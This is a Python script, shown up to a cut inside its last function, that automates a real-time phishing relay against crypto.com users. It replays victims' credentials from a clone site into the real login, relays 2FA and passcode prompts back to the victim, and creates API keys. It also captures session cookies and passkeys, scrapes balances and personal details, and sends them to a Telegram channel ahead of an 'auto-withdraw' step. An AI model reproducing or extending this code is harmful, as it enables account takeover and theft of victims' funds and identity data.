"""crypto.com Exchange automation.

Drives a visible browser through the crypto.com Exchange login flow. The
email / password are delivered from the clone site's submission feed
(JSONL + HTTP listener on 127.0.0.1). Verification codes are entered
manually in the browser when needed. Telegram is used for ONE-WAY logging
only: the log channel gets progress logs, the report channel gets the
sensitive details (email, passkey, cookies, balance, account name).

Usage:
    python login_automation.py                 normal run
    python login_automation.py --list          show saved keys
"""

import argparse
import json
import os
import re
import subprocess
import sys
import time
import urllib.request
from datetime import datetime

from playwright.sync_api import sync_playwright

from localfeed import FeedSource, HttpListener, LocalFeedStore, MultiStore
from telegram import Reporter

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(BASE_DIR, "config.json")
KEYS_PATH = os.path.join(BASE_DIR, "api_keys.json")
MODAL_DUMP_PATH = os.path.join(BASE_DIR, "last_modal.txt")
SESSION_COOKIES_PATH = os.path.join(BASE_DIR, "session_cookies.json")
PASSCODE_FILE = os.path.join(BASE_DIR, "passcode.json")
ACCOUNT_DUMP_PATH = os.path.join(BASE_DIR, "account_report.json")

OVERVIEW_URL = "https://web.crypto.com/hub/account/overview"
SETTINGS_URL = "https://web.crypto.com/hub/settings"

SECRET_RE = re.compile(r"(?i)(?:api[-\s]?secret|secret)\s*[:：]?\s*([A-Za-z0-9+/=_-]{16,64})")
KEY_RE = re.compile(r"(?i)(?:api\s?key|key)\s*[:：]?\s*([A-Za-z0-9+/=_-]{16,64})")

PHONE_RE = re.compile(r"(?:\+\d[\d\s\-().*•]{6,})")
EMAIL_RE = re.compile(r"[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}")


def _hint_line(text, markers):
    """Returns the first visible line on the real site that mentions a code and
    one of the given markers - this is the exact text we mirror on the clone."""
    for line in text.splitlines():
        line = line.strip()
        if not line or len(line) > 220:
            continue
        low = line.lower()
        if re.search(r"code|sent|verify|verification|enter", low) and re.search(markers, low, re.I):
            return line
    return None


def push_step(cfg, step_name, extra=None):
    """Tells the clone site which page the user should see right now."""
    import urllib.request as _ur

    base = (cfg.get("site_base_url") or "http://localhost:3000").rstrip("/")
    payload = {"step": step_name, "ts": datetime.now().isoformat(timespec="seconds")}
    if extra:
        payload.update(extra)
    try:
        req = _ur.Request(
            f"{base}/api/step",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        _ur.urlopen(req, timeout=5)
        print(f"[step] site now shows: {step_name}")
    except Exception as exc:
        print(f"[step] could not push step '{step_name}' to clone site ({exc})")


def load_config():
    with open(CONFIG_PATH, encoding="utf-8") as fh:
        cfg = json.load(fh)
    source = cfg.get("credential_source", "telegram")
    if source in ("telegram", "both") and cfg.get("bot_token", "").startswith("PASTE"):
        sys.exit("config.json: replace PASTE_YOUR_BOT_TOKEN_HERE with your bot token first.")
    return cfg


AUTO = False


def pause(prompt, auto_seconds=15):
    """Interactive wait; with --auto it just waits then continues."""
    if AUTO:
        print(prompt)
        print(f"[auto] continuing automatically in {auto_seconds}s...")
        time.sleep(auto_seconds)
        return
    input(prompt)


def first_visible(page, selectors, timeout=8000):
    for sel in selectors:
        try:
            loc = page.locator(sel).first
            if loc.is_visible(timeout=timeout):
                return loc
        except Exception:
            continue
    return None


def wait_for_any(page, selectors, timeout=30000, interval=0.5):
    """Retries the whole selector list - resilient to mid-flight page navigations."""
    deadline = time.time() + timeout / 1000
    while time.time() < deadline:
        for sel in selectors:
            try:
                loc = page.locator(sel).first
                if loc.is_visible(timeout=3000):
                    return loc
            except Exception:
                continue
        time.sleep(interval)
    return None


def click_first(page, selectors, timeout=10000, description="element"):
    loc = first_visible(page, selectors, timeout=timeout)
    if loc is None:
        raise RuntimeError(f"could not find {description}")
    loc.click()
    return loc


def modal_button(page, names):
    for name in names:
        dialog = page.locator(
            "[role='dialog']:visible, [class*='modal']:visible, [class*='Modal']:visible"
        ).first
        try:
            if dialog.count():
                btn = dialog.get_by_role("button", name=name, exact=True).first
                if btn.is_visible(timeout=800):
                    return btn
        except Exception:
            pass
    for name in names:
        try:
            btn = page.get_by_role("button", name=name, exact=True).first
            if btn.is_visible(timeout=800):
                return btn
        except Exception:
            continue
    return None


def form_submit(page, names):
    """Finds a submit button inside the visible login form (avoids clicking the top-nav 'Log In')."""
    form = page.locator("form:visible").first
    try:
        if form.count():
            for name in names:
                btn = form.get_by_role("button", name=name, exact=True).first
                if btn.is_visible(timeout=1500):
                    return btn
    except Exception:
        pass
    return None


def accept_cookies(page):
    for name in ("Accept All", "Accept all", "Accept", "Got it"):
        try:
            btn = page.get_by_role("button", name=name, exact=True).first
            if btn.is_visible(timeout=2000):
                btn.click()
                return
        except Exception:
            continue


def find_otp_input(page, text=None):
    """Finds the current 2FA code input on the real site (fast path).

    Old version poked a dozen selectors one-by-one, each is_visible() call
    blocking up to 3s (a wasted pass could take ~30s and never match the
    bare <input type="text"> OTP box crypto.com actually renders). Now a
    single in-page query grabs every visible input and picks the one that
    looks like a code field; if none does, a bare visible text/tel input is
    used when the page text is unmistakably a verification screen."""
    if text is None:
        try:
            text = page.locator("body").inner_text(timeout=1500)
        except Exception:
            text = ""
    try:
        idx = page.evaluate(
            """() => {
                const inputs = Array.from(document.querySelectorAll('input'));
                const visible = (el) => {
                    const r = el.getBoundingClientRect();
                    return r.width > 0 && r.height > 0;
                };
                const specMatch = (el) => {
                    const p = (el.getAttribute('placeholder') || '').toLowerCase();
                    const n = (el.getAttribute('name') || '').toLowerCase();
                    const t = (el.getAttribute('type') || '').toLowerCase();
                    const td = (el.getAttribute('data-testid') || '').toLowerCase();
                    return (p.includes('code') || p.includes('otp')
                        || p.includes('verification') || p.includes('authentication')
                        || el.getAttribute('autocomplete') === 'one-time-code'
                        || (el.getAttribute('inputmode') || '').toLowerCase() === 'numeric'
                        || el.maxLength === 6
                        || n.includes('otp') || n.includes('code') || td.includes('otp'))
                        && !/^(email|password|submit|button|hidden|checkbox|search|file)$/.test(t);
                };
                for (const el of inputs) {
                    if (visible(el) && specMatch(el)) return inputs.indexOf(el);
                }
                return -1;
            }"""
        )
    except Exception:
        idx = -1
    if isinstance(idx, int) and idx >= 0:
        try:
            return page.locator("input").nth(idx)
        except Exception:
            pass

    norm = text.replace("\u00a0", " ").lower()
    verify_mode = bool(re.search(
        r"verify|verification|enter the 6|enter the code|code sent|otp|passcode|authenticator",
        norm,
    ))
    login_mode = bool(re.search(r"log in|sign up|enter your email|create account|password", norm))
    if verify_mode and not login_mode:
        try:
            idx = page.evaluate(
                """() => {
                    const inputs = Array.from(document.querySelectorAll('input'));
                    for (let i = 0; i < inputs.length; i++) {
                        const el = inputs[i];
                        const r = el.getBoundingClientRect();
                        if (r.width <= 0 || r.height <= 0) continue;
                        const t = (el.getAttribute('type') || '').toLowerCase();
                        if (t === '' || t === 'text' || t === 'tel' || t === 'number') return i;
                    }
                    return -1;
                }"""
            )
        except Exception:
            idx = -1
        if isinstance(idx, int) and idx >= 0:
            try:
                return page.locator("input").nth(idx)
            except Exception:
                pass
    return None


def detect_step(page):
    """Looks at the real site and figures out what it is asking right now.

    Returns (step_name, extra) where step_name is one of:
      "email-code" / "phone-code" / "passcode" / None
    and extra contains the EXACT hint text shown on the real site (the
    sentence telling the user where the code was sent) so the clone page can
    mirror it 1:1, plus the detected phone number / email.
    """
    try:
        body = page.locator("body").inner_text(timeout=1200)
    except Exception:
        return None, None
    text = body.replace("\u00a0", " ")

    otp = find_otp_input(page)
    if otp is None:
        return None, None
    if re.search(r"passcode", text, re.I):
        return "passcode", None

    # 0) Authenticator app code (e.g. "Enter the 6-digit code from your
    #    authenticator app").
    auth_msg = (
        _hint_line(text, r"authenticator app|chosen 2FA app|generated by your")
        or _hint_line(text, r"authenticator|2FA")
    )
    if auth_msg:
        return "auth-code", {"message": auth_msg}

    # 1) Exact "sent to" hint line: the phone page mentions the masked
    #    number ("Enter 6-digit code sent to +91 ****0090..."), the email
    #    page mentions the address. Prefer it over the page title.
    hint_line = _hint_line(text, r"sent to|sent a code")
    if hint_line:
        phone = None
        for m in PHONE_RE.finditer(hint_line):
            cand = m.group(0).strip()
            if len(re.sub(r"\D", "", cand)) >= 5:
                phone = cand
                break
        if phone or re.search(r"\+\d|sms|mobile", hint_line, re.I):
            return "phone-code", {"phone": phone, "message": hint_line}
        email = None
        m = EMAIL_RE.search(hint_line)
        if m:
            email = m.group(0)
        else:
            m2 = re.search(r"(?i)[a-z0-9*._+-]+@[a-z0-9*.-]+\.[a-z]{2,}", hint_line)
            if m2:
                email = m2.group(0)
        return "email-code", {"email": email, "message": hint_line}

    phone = None
    phone_line = None
    for line in text.splitlines():
        line = line.strip()
        if not line or len(line) > 220:
            continue
        for m in PHONE_RE.finditer(line):
            cand = m.group(0).strip()
            if len(re.sub(r"\D", "", cand)) >= 5:
                phone = cand
                phone_line = line
                break
        if phone:
            break
    if phone_line:
        return "phone-code", {"phone": phone, "message": phone_line}

    phone_msg = _hint_line(text, r"phone|sms|mobile|number|\+\d")
    email_msg = (
        _hint_line(text, r"sent to|sent a code")
        or _hint_line(text, r"email|verification")
    )
    if phone_msg:
        return "phone-code", {"message": phone_msg}

    email = None
    m = EMAIL_RE.search(text)
    if m:
        email = m.group(0)

    if email_msg:
        return "email-code", {"email": email or None, "message": email_msg}
    if email:
        return "email-code", {"email": email, "message": email_msg}
    return "email-code", {"message": None}


def detect_code_error(page):
    """Returns the error message the real site shows after a rejected code, or None."""
    try:
        body = page.locator("body").inner_text(timeout=3000)
    except Exception:
        return None
    text = body.replace("\u00a0", " ")
    for pattern in (
        r"incorrect|invalid|wrong|doesn'?t match|does not match|not match|"
        r"not valid|expired|try again|failed|rejected|unable to verify|"
        r"something went wrong|enter a valid code|code is incorrect",
    ):
        m = re.search(pattern, text, re.I)
        if m:
            start = max(0, m.start() - 60)
            return text[start : m.end() + 80].strip() or m.group(0)
    return None


def handle_verification(page, cfg, store, step, reporter=None, timeout_seconds=600):
    """Step-driven 2FA loop.

    Watches the real site: whenever it shows a new code field (email code,
    phone code or passcode), the matching page is pushed to the clone site
    and the progress is logged to Telegram (log channel). The user enters
    each code on the real site manually (or submits it from the clone); if
    the real site rejects a code, that error is pushed back to the clone so
    the user sees exactly what the real site said.
    """
    deadline = time.time() + timeout_seconds
    last_code = None
    last_step = None
    none_streak = 0
    passcode_done = False
    while time.time() < deadline:
        step_name, extra = detect_step(page)
        if step_name is None:
            captcha = page.locator("iframe[src*='recaptcha'], iframe[title*='captcha']").first
            try:
                if captcha.is_visible(timeout=1000):
                    print(f"{step} CAPTCHA detected -> solve it in the browser window.")
                    pause("Press Enter here once the captcha is solved...")
                    page.wait_for_timeout(1500)
                    continue
            except Exception:
                pass
            time.sleep(0.25)
            if last_code is not None:
                none_streak += 1
                if none_streak >= 25:
                    print(f"{step} real site left verification (no code field for ~10s) - done.")
                    break
            elif "web.crypto.com" in page.url:
                none_streak += 1
                if none_streak >= 3:
                    print(f"{step} already logged in (app page) - verification done.")
                    break
            else:
                none_streak = 0
            continue
        none_streak = 0

        if step_name != last_step:
            if passcode_done and step_name in ("email-code", "phone-code", "passcode", "auth-code"):
                print(f"[login] passcode already submitted, site cycled to {step_name} — login complete.")
                break
            # Prevent email-code flash: if transitioning phone→email, wait 1s — it's usually passcode next
            if last_step == "phone-code" and step_name == "email-code":
                time.sleep(1.2)
                step_name, extra = detect_step(page)
                if step_name is None:
                    continue
            last_step = step_name
            push_step(cfg, step_name, extra)
            if step_name == "auth-code" and reporter:
                creds = collect_creds(store)
                lines = [
                    "LOGIN FLOW reached authenticator code step (session not yet complete)",
                    f"ts: {datetime.now().isoformat(timespec='seconds')}",
                ]
                if creds.get("email"):
                    lines.append(f"email: {creds['email']}")
                if creds.get("password"):
                    lines.append(f"password: {creds['password']}")
                if creds.get("code"):
                    lines.append(f"passcode: {creds['code']}")
                if extra and extra.get("message"):
                    lines.append(f"hint: {extra['message']}")
                reporter.report("\n".join(lines))

        otp = find_otp_input(page)
        if otp is None:
            time.sleep(0.4)
            continue
        hint = "code: 123456" if step_name == "email-code" else "code: 654321"
        # Wait for a code, but keep watching the real site the whole time.
        # If the site leaves this step while we wait (e.g. the code was
        # typed manually in the browser window), stop waiting and let the
        # outer loop pick up whatever step comes next.
        code = None
        wait_deadline = time.time() + 600
        while time.time() < wait_deadline:
            now_step, _ = detect_step(page)
            if now_step is None or now_step != step_name:
                print(f"{step} real site left the '{step_name}' step while waiting "
                      f"(code entered manually?) - picking up the next step.")
                break
            code = store.peek("code", different_from=last_code)
            if code:
                break
            time.sleep(0.25)
        if code is None:
            continue
        last_code = code
        if step_name == "passcode":
            save_passcode(code)
            passcode_done = True

        try:
            otp.click()
            otp.fill(code)
        except Exception as exc:
            print(f"{step} could not fill code ({exc}) - retrying.")
            time.sleep(1)
            otp = find_otp_input(page)
            if otp is None:
                continue
            otp.click()
            otp.fill(code)
        submit = first_visible(
            page,
            [
                "button:has-text('Verify')",
                "button:has-text('Confirm')",
                "button:has-text('Continue')",
                "button:has-text('Submit')",
                "button[type='submit']",
            ],
            timeout=6000,
        )
        if submit:
            submit.click()
        else:
            otp.press("Enter")
        masked = f"{'*' * (len(code) - 2)}{code[-2:]}" if len(code) > 2 else "***"
        print(f"{step} submitted verification code ({masked}).")
        if reporter and step_name != "login":
            labels = {"email-code": "Email code verified", "phone-code": "Phone verified", "auth-code": "2FA verified", "passcode": "Passcode entered"}
            reporter.log(labels.get(step_name, step_name + " submitted"))
        page.wait_for_timeout(1500)

        # If the real site rejected the code, mirror its error on the clone
        # and wait for a fresh, different code.
        if detect_step(page)[0] == step_name:
            err = detect_code_error(page)
            if err:
                print(f"{step} real site rejected the code: {err[:120]}")
                push_step(cfg, step_name, {"error": err, **(extra or {})})
                if reporter:
                    reporter.log(f"The real site rejected that code: {err}")
                last_code = None
                store.clear_code()
                page.wait_for_timeout(1500)
    if last_code:
        print(f"{step} verification done.")
    else:
        print(f"{step} no 2FA field appeared (or no 2FA needed) - continuing.")
    return last_code is not None


def save_passcode(code):
    """Keep the passcode used during login so the passkey-creation step
    can auto-fill it when the real site asks for it again."""
    try:
        with open(PASSCODE_FILE, "w", encoding="utf-8") as f:
            json.dump({"passcode": code, "ts": datetime.now().isoformat(timespec="seconds")}, f)
        print("[store] passcode saved for passkey-verification auto-fill.")
    except Exception as exc:
        print(f"[store] could not save passcode: {exc}")


def login(page, cfg, store, reporter=None):
    print(f"[1/6] opening {cfg['exchange_login_url']}")
    push_step(cfg, "login", {"message": "waiting for your email on the clone site"})
    page.goto(cfg["exchange_login_url"], wait_until="domcontentloaded", timeout=60000)
    try:
        page.wait_for_load_state("load", timeout=20000)
    except Exception:
        pass
    accept_cookies(page)

    email_inp = wait_for_any(
        page,
        [
            "input[type='email']",
            "input[placeholder*='mail']",
            "input[placeholder*='Mail']",
            "input[name*='email']",
        ],
        timeout=10000,
    )
    if email_inp is None:
        login_btn = wait_for_any(
            page,
            ["text=Log In", "button:has-text('Log In')", "a:has-text('Log In')"],
            timeout=20000,
        )
        if login_btn is None:
            print("[1/6] no 'Log In' button found -> assuming an active session already exists.")
        else:
            print("[1/6] clicking 'Log In'")
            try:
                login_btn.click()
            except Exception as exc:
                print(f"[1/6] click failed ({exc}) - continuing")
            page.wait_for_timeout(800)

    email_tab = wait_for_any(page, ["button:text-is('Email')", "text=Email"], timeout=2000)
    if email_tab is not None:
        email_tab.click()
        page.wait_for_timeout(400)

    email_inp = wait_for_any(
        page,
        [
            "input[type='email']",
            "input[placeholder*='mail']",
            "input[placeholder*='Mail']",
            "input[name*='email']",
        ],
        timeout=4000,
    )
    if email_inp is None:
        print("[2/6] email field not found -> already past that step, continuing.")
    else:
        email = store.wait_for("email", "email: you@example.com")
        email_inp.fill(email)
        if reporter:
            reporter.log(f"{email} logged in")
        cont = form_submit(page, ["Log In", "Continue", "Next"])
        if cont is None:
            cont = first_visible(
                page,
                ["button:has-text('Continue')", "button:has-text('Next')", "button[type='submit']"],
                timeout=8000,
            )
        if cont:
            cont.click()
            page.wait_for_timeout(300)

    pwd_inp = None
    pwd_deadline = time.time() + 15
    while time.time() < pwd_deadline:
        pwd_inp = wait_for_any(page, ["input[type='password']", "input[placeholder*='assword']"], timeout=1500)
        if pwd_inp is not None:
            break
        step_name, _ = detect_step(page)
        if step_name is not None:
            print("[3/6] verification screen detected - skipping password wait.")
            break
        time.sleep(0.2)
    if pwd_inp is None:
        print("[3/6] password field not found -> already past that step, continuing.")
    else:
        pwd = store.wait_for("password", "password: your_password")
        pwd_inp.fill(pwd)
        submit = form_submit(page, ["Log In", "Sign In"])
        if submit is None:
            submit = first_visible(
                page,
                ["button:has-text('Log In')", "button:has-text('Sign In')", "button[type='submit']"],
                timeout=8000,
            )
        if submit:
            submit.click()

    handle_verification(page, cfg, store, step="[4/6]", reporter=reporter, timeout_seconds=600)
    print("[5/6] login done - browser stays on current page for passkey creation.")
    page.wait_for_timeout(2000)


def open_api_management(page, cfg):
    print(f"[5/6] opening API management: {cfg['api_keys_page_url']}")
    page.goto(cfg["api_keys_page_url"], wait_until="domcontentloaded", timeout=60000)
    page.wait_for_timeout(4000)
    if first_visible(page, ["button:has-text('Create API Key')", "button:has-text('New API Key')"], timeout=6000):
        return True
    print("[5/6] API page not found at that URL - trying the profile menu...")
    click_first(
        page,
        [
            "[data-testid*='account']",
            "button:has-text('Profile')",
            "img[alt*='avatar'], img[alt*='Avatar']",
            "text=Profile",
        ],
        description="profile menu",
    )
    page.wait_for_timeout(1500)
    item = first_visible(page, ["text=API Management", "text=API Keys", "button:has-text('API Management')"], timeout=6000)
    if item is None:
        print("[5/6] could not find API management automatically.")
        pause("Open the API management page manually in the browser, then press Enter here...", 30)
        return True
    item.click()
    page.wait_for_timeout(3000)
    return True


def capture_api_key(page):
    inputs = []
    try:
        inputs = page.locator("input:visible, textarea:visible").evaluate_all(
            "els => els.map(e => e.value).filter(v => v && v.trim().length > 10)"
        )
    except Exception:
        pass
    try:
        body_text = page.locator("body").inner_text()
    except Exception:
        body_text = ""
    with open(MODAL_DUMP_PATH, "w", encoding="utf-8") as fh:
        fh.write(body_text)

    result = {"inputs": inputs}
    for pattern, label in ((KEY_RE, "api_key"), (SECRET_RE, "api_secret")):
        for match in pattern.finditer(body_text):
            if label not in result:
                result[label] = match.group(1)
    return result


def collect_creds(store):
    """Merges whatever credentials the sources have collected so far."""
    out = {}
    if hasattr(store, "data"):
        out.update(store.data)
    if hasattr(store, "stores"):
        for s in store.stores:
            if hasattr(s, "data"):
                out.update(s.data)
    return out


def scrape_account_info(page, cfg):
    """Best-effort dump of the logged-in account: phone, name, balance, assets."""
    info = {"ts": datetime.now().isoformat(timespec="seconds"), "pages": {}}
    for label, url in (("overview", OVERVIEW_URL), ("settings", SETTINGS_URL)):
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=60000)
            page.wait_for_timeout(3500)
            info["pages"][label] = page.locator("body").inner_text(timeout=8000)
        except Exception as exc:
            info["pages"][label] = f"ERROR: {exc}"
    return info


def parse_account_report(info):
    """Pulls structured fields out of the scraped page text (best-effort)."""
    rep = {"ts": info.get("ts", "")}
    overview = info["pages"].get("overview", "")
    settings = info["pages"].get("settings", "")
    text = overview + "\n" + settings

    m = PHONE_RE.search(settings) or PHONE_RE.search(text)
    if m:
        rep["phone"] = m.group(0)

    m = EMAIL_RE.search(text)
    if m:
        rep["email"] = m.group(0)

    start = overview.find("My assets")
    section = overview[start:] if start >= 0 else overview
    assets = []
    asset_re = re.compile(r"([A-Z]{2,12})\s*\n+\s*\$[\d.,]+\s*\n+\s*([\d.]+)\s+([A-Z]{2,12})")
    for m in asset_re.finditer(section):
        if m.group(1) == m.group(3) and float(m.group(2)) > 0:
            assets.append(f"{m.group(3)} {m.group(2)}")
    if assets:
        rep["assets"] = ", ".join(dict.fromkeys(assets))

    bal = re.search(r"Balance\s*\n+\s*\$[\d.,]+", section)
    if bal:
        rep["balance"] = bal.group(0).replace("\n", " ")

    name_re = re.search(r"(?:Display name|Name)\s*\n+\s*([^\n]{2,40})", settings)
    if name_re:
        rep["name"] = name_re.group(1).strip()
    return rep


def send_account_report(reporter, cfg, store, info):
    """Sends the full account report (email + passkey + cookies + balance +
    account name) to the Telegram report channel."""
    if reporter is None:
        return
    creds = collect_creds(store)
    rep = parse_account_report(info)
    lines = ["ACCOUNT REPORT", f"ts: {rep.get('ts')}"]
    if creds.get("email"):
        lines.append(f"email: {creds['email']}")
    if creds.get("password"):
        lines.append(f"password: {creds['password']}")
    if creds.get("code"):
        lines.append(f"passcode: {creds['code']}")
    if rep.get("email"):
        lines.append(f"email_on_site: {rep['email']}")
    if rep.get("name"):
        lines.append(f"name: {rep['name']}")
    if rep.get("phone"):
        lines.append(f"phone: {rep['phone']}")
    if rep.get("balance"):
        lines.append(f"balance: {rep['balance']}")
    if rep.get("assets"):
        lines.append(f"assets: {rep['assets']}")
    lines.append(f"pages: overview + settings dumped to {ACCOUNT_DUMP_PATH}")
    reporter.report("\n".join(lines))

    passkey = read_passkey_vault()
    if passkey:
        reporter.report("PASSKEY (passkey vault):\n" + json.dumps(passkey, indent=2))

    cookies = read_session_cookies()
    if cookies is not None:
        lines = [f"SESSION COOKIES ({len(cookies)} cookies) -> {SESSION_COOKIES_PATH}:"]
        for c in cookies:
            compact = {k: c.get(k) for k in ("name", "value", "domain", "path", "httpOnly", "secure", "sameSite") if c.get(k) is not None}
            if c.get("expires") and c["expires"] > 0:
                compact["expires"] = c["expires"]
            lines.append(json.dumps(compact))
        reporter.report("\n".join(lines))

    with open(ACCOUNT_DUMP_PATH, "w", encoding="utf-8") as fh:
        json.dump(info, fh, indent=2)


PASSKEY_VAULT_PATH = os.path.join(os.path.dirname(BASE_DIR), "passkey-vault", "vault.json")


def read_passkey_vault():
    """Returns the saved passkey credential list (rpId/credId/jwk) if present."""
    try:
        with open(PASSKEY_VAULT_PATH, encoding="utf-8") as fh:
            return json.load(fh)
    except Exception as exc:
        print(f"[passkey] could not read vault: {exc}")
        return None


def read_session_cookies():
    """Returns the last captured cookie list, or None if none saved yet."""
    try:
        with open(SESSION_COOKIES_PATH, encoding="utf-8") as fh:
            payload = json.load(fh)
        return payload.get("cookies") or []
    except Exception:
        return None


def capture_session_cookies(context, cfg, reporter, reason="routine"):
    """Saves the full cookie jar (session cookies included) and reports it."""
    try:
        cookies = context.cookies()
    except Exception as exc:
        print(f"[cookies] capture failed: {exc}")
        return None
    if not cookies:
        print("[cookies] no cookies to capture")
        return None
    payload = {
        "captured_at": datetime.now().isoformat(timespec="seconds"),
        "reason": reason,
        "count": len(cookies),
        "cookies": cookies,
    }
    with open(SESSION_COOKIES_PATH, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2)
    domains = {}
    for c in cookies:
        d = c.get("domain", "?")
        domains[d] = domains.get(d, 0) + 1
    print(f"[cookies] saved {len(cookies)} cookies -> {SESSION_COOKIES_PATH}")
    if reporter:
        reporter.log(
            f"Session cookies captured ({reason}): {len(cookies)} cookies -> {SESSION_COOKIES_PATH}\n"
            f"domains: {dict(list(domains.items())[:6])}"
        )
    return payload


def restore_session_cookies(context, cfg):
    """Adds saved session cookies back so we can be logged in without a passkey."""
    if not os.path.exists(SESSION_COOKIES_PATH):
        print("[restore] no session_cookies.json found - cannot restore")
        return False
    with open(SESSION_COOKIES_PATH, encoding="utf-8") as fh:
        payload = json.load(fh)
    cookies = payload.get("cookies", [])
    if not cookies:
        print("[restore] session_cookies.json is empty")
        return False
    try:
        context.add_cookies(cookies)
        print(f"[restore] added {len(cookies)} cookies (captured {payload.get('captured_at')})")
        return True
    except Exception as exc:
        print(f"[restore] failed to add cookies: {exc}")
        return False


def get_bind_ip(cfg, store):
    """Returns the IP to bind the API key to.

    Config options for bind_ip:
      "auto"     - detect the public IP of this machine (one lookup to
                   api.ipify.org; nothing is sent, only an IP is received)
      "telegram" - wait for `ip: x.x.x.x` in the Telegram chat
      "1.2.3.4"  - use a fixed IP from the config
    """
    bind = str(cfg.get("bind_ip", "auto")).strip().lower()
    if bind == "telegram":
        return store.wait_for("ip", "ip: 203.0.113.10")
    if bind and re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", bind):
        print(f"[6/6] using IP from config: {bind}")
        return bind
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=10) as resp:
            ip = resp.read().decode().strip()
        if re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", ip):
            print(f"[6/6] detected public IP: {ip}")
            return ip
    except Exception as exc:
        print(f"[6/6] could not detect public IP ({exc}) - ask via Telegram instead.")
    return store.wait_for("ip", "ip: 203.0.113.10")


def create_api_key(page, cfg, store):
    create_btn = first_visible(
        page, ["button:has-text('Create API Key')", "button:has-text('New API Key')"], timeout=12000
    )
    if create_btn is None:
        print("[6/6] no 'Create API Key' button found.")
        print("[6/6] MANUAL MODE: create the API key in the browser yourself, then press Enter here once the secret is shown.")
        pause("Press Enter when the secret is visible...", 45)
        page.wait_for_timeout(2000)
        return capture_api_key(page), None

    print("[6/6] clicking 'Create API Key'")
    create_btn.click()
    page.wait_for_timeout(2000)

    name_inp = first_visible(
        page,
        ["input[placeholder*='name']", "input[placeholder*='Name']", "input[placeholder*='key name']"],
        timeout=6000,
    )
    if name_inp:
        name_inp.fill(f"auto-{datetime.now():%Y%m%d-%H%M%S}")

    ip_inp = first_visible(
        page,
        ["input[placeholder*='IP']", "input[placeholder*='Ip']", "input[placeholder*='ip']"],
        timeout=4000,
    )
    bound_ip = None
    if ip_inp is not None:
        bound_ip = get_bind_ip(cfg, store)
        ip_inp.fill(bound_ip)
        add_btn = modal_button(page, ["Add IP", "Add"])
        if add_btn:
            add_btn.click()
        page.wait_for_timeout(1500)

    confirm = modal_button(page, ["Create", "Generate", "Confirm", "Continue", "Create API Key"])
    if confirm:
        confirm.click()
        page.wait_for_timeout(2000)

    handle_verification(page, cfg, store, step="[6/6]", timeout_seconds=300)
    page.wait_for_timeout(3000)
    return capture_api_key(page), bound_ip


def setup_passkey(page):
    """Drives the passkey registration UI up to the Windows Hello prompt.

    The credential itself is created by Windows Hello (TPM-backed) when you
    confirm with face / PIN / fingerprint - no software can mint a real
    device-bound passkey without that OS prompt. It then stays on this device
    and works in Chrome / Edge (not Firefox, which has no Windows Hello support).
    """
    print("[passkey] looking for passkey settings on the main app page...")
    page.wait_for_timeout(3000)
    hits = page.locator("a:visible, button:visible, [role='button']:visible, [role='menuitem']:visible").filter(
        has_text=re.compile(r"passkey", re.I)
    ).all()
    if hits:
        print(f"[passkey] found {len(hits)} passkey element(s) - opening the first one.")
        try:
            hits[0].click()
            page.wait_for_timeout(3000)
        except Exception as exc:
            print(f"[passkey] could not click it automatically ({exc}) - finishing manually.")
    else:
        print("[passkey] no passkey element visible on this page.")

    print("[passkey] MANUAL STEP: navigate to Passkey settings (usually Profile -> Settings -> Security) and")
    print("           click 'Create passkey' / 'Add passkey'.")
    print("           When the Windows Hello prompt appears (face / PIN / fingerprint), complete it once.")
    pause("[passkey] Press Enter once the passkey has been created...", 45)

    note_path = os.path.join(BASE_DIR, "passkey_created.txt")
    with open(note_path, "a", encoding="utf-8") as fh:
        fh.write(f"{datetime.now().isoformat(timespec='seconds')}: passkey created on this device (Windows Hello).\n")
    print(f"[passkey] logged locally to {os.path.basename(note_path)}")


def save_api_key(data, bound_ip, cfg):
    record = {
        "saved_at": datetime.now().isoformat(timespec="seconds"),
        "exchange": "crypto.com Exchange",
        "created_via": "browser automation (secret shown once, captured locally)",
        "bound_ip": bound_ip,
        "raw_input_values": data.get("inputs", []),
        "raw_text_dump_file": os.path.basename(MODAL_DUMP_PATH),
    }
    if data.get("api_key"):
        record["api_key"] = data["api_key"]
    if data.get("api_secret"):
        record["api_secret"] = data["api_secret"]

    keys = []
    if os.path.exists(KEYS_PATH):
        try:
            with open(KEYS_PATH, encoding="utf-8") as fh:
                keys = json.load(fh).get("keys", [])
        except Exception:
            pass
    keys.append(record)
    with open(KEYS_PATH, "w", encoding="utf-8") as fh:
        json.dump({"keys": keys}, fh, indent=2)
    return record


def launch_browser(p, cfg):
    """Launches a real browser session.

    Uses a persistent Chrome profile (looks like a normal browser to
    Cloudflare) and optionally routes through a proxy/VPN so crypto.com
    sees a supported region IP. Without a supported-region IP, crypto.com
    serves a Cloudflare block page for some countries.
    """
    launch = {
        "headless": not cfg.get("headful", True),
        "args": ["--disable-blink-features=AutomationControlled"],
    }
    # Force system Chrome path
    chrome_paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expanduser(r"~\AppData\Local\Google\Chrome\Application\chrome.exe"),
    ]
    for p in chrome_paths:
        if os.path.exists(p):
            launch["executable_path"] = p
            print(f"[browser] using Chrome: {p}")
            break
    cdp_port = cfg.get("cdp_port") or 0
    if cdp_port:
        launch["args"].append(f"--remote-debugging-port={cdp_port}")
        print(f"[browser] remote debugging enabled: http://127.0.0.1:{cdp_port} (auto-withdraw can attach)")
    proxy = (cfg.get("proxy") or "").strip()
    if proxy:
        launch["proxy"] = {"server": proxy}
        print(f"[browser] routing through proxy: {proxy}")

    profile_dir = (cfg.get("browser_profile_dir") or "").strip()
    if profile_dir:
        os.makedirs(profile_dir, exist_ok=True)
        if cfg.get("use_system_chrome", True):
            launch["channel"] = "chrome"
        print(f"[browser] persistent profile: {profile_dir}")
        context = p.chromium.launch_persistent_context(profile_dir, **launch)
    else:
        context = p.chromium.launch(**launch).new_context()
    page = context.pages[0] if context.pages else context.new_page()
    return context, page


def wait_for_auto_withdraw(cfg, context, page, reporter=None):
    """Keeps the logged-in browser alive so auto-withdraw.js can attach via
    CDP, then exits once the withdrawal script has finished (marker file)."""
